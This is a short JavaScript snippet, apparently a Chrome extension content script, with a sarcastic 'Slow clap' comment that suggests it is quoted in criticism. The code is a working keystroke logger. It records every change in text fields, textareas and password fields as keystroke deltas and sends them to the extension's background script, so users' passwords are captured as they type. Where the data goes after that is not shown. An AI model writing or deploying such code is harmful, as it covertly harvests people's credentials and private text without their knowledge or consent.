// type=password: Slow clap :)
$(document).on('input', 'input[type=text],input[type=password],textarea', function (e) {
    var old = $(this).attr('data-old-value') || '',
        cur = $(this).val() || '';

    // This deserves a comment: Find longest common prefix and send delta. If old
    // string has stuff beyond longest common prefix, send indications of how
    // many characters were deleted.
    var at = 0;
    while (at < old.length && at < cur.length && old[at] == cur[at]) at++;
    var diff = '';
    for (var i = at; i < old.length; ++i) diff += '<BACKSPACE>';
    for (var i = at; i < cur.length; ++i) diff += cur[i];

    $(this).attr('data-old-value', cur);

    chrome.runtime.sendMessage(diff, function (x) { });
});

